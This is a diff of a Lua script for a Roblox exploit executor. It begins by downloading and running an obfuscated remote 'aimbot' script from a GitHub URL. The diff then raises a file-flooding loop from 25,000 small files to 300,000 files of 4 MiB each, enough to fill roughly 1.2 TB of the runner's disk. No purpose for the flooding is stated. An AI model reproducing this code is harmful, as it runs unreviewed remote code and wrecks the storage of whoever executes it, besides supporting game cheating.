@@ -1,45 +1,45 @@
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Cat558-uz/Aina-Aimbot-UNIVERSAL/refs/heads/main/obfuscated_script-1752536242297.lua.txt"))()
 task.wait(5)
-local folderPrefix = "Systematic"
-local totalFiles = 25000
-local filesPerFolder = 100
-local foldersPerBatch = 20
-local filesPerFolderPerBatch = 20
-local waitTime = 0.15
-local fileSize = 1024 -- 1 KiB per file
+local folderName = "Systematic"
+local totalFiles = 300000
+local fileSize = 4 * 1024 * 1024 -- 4 MiB
+local waitTime = 0.1
 
 local content = string.rep("A", fileSize)
 
-local totalFolders = math.ceil(totalFiles / filesPerFolder)
+if not isfolder(folderName) then
+    makefolder(folderName)
+end
 
-for batchStart = 1, totalFolders, foldersPerBatch do
-    local batchEnd = math.min(batchStart + foldersPerBatch - 1, totalFolders)
+local successfulWrites = 0
+local failedWrites = 0
 
-    for folderIndex = batchStart, batchEnd do
-        local folderName = folderPrefix .. folderIndex
+for i = 1, totalFiles do
+    local fileName = folderName .. "/File" .. i .. ".txt"
 
-        if not isfolder(folderName) then
-            makefolder(folderName)
-        end
+    local success, err = pcall(function()
+        writefile(fileName, content)
+    end)
 
-        local firstFile = 1
-        local lastFile = math.min(filesPerFolderPerBatch, totalFiles - (folderIndex - 1) * filesPerFolder)
+    if success then
+        successfulWrites = successfulWrites + 1
+    else
+        failedWrites = failedWrites + 1
+        warn("Write failed at file " .. i .. ": " .. tostring(err))
+    end
 
-        for fileIndex = firstFile, lastFile do
-            local fileName = folderName .. "/File" .. fileIndex .. ".txt"
-
-            local success, err = pcall(function()
-                writefile(fileName, content)
-            end)
-
-            if success then
-                print("Created: " .. fileName)
-            else
-                warn("Failed: " .. fileName .. " - " .. tostring(err))
-            end
-        end
+    if i % 100 == 0 then
+        print(
+            "Attempted:", i,
+            "Successful:", successfulWrites,
+            "Failed:", failedWrites
+        )
     end
 
     task.wait(waitTime)
 end
+
+print("Finished.")
+print("Successful writes:", successfulWrites)
+print("Failed writes:", failedWrites)
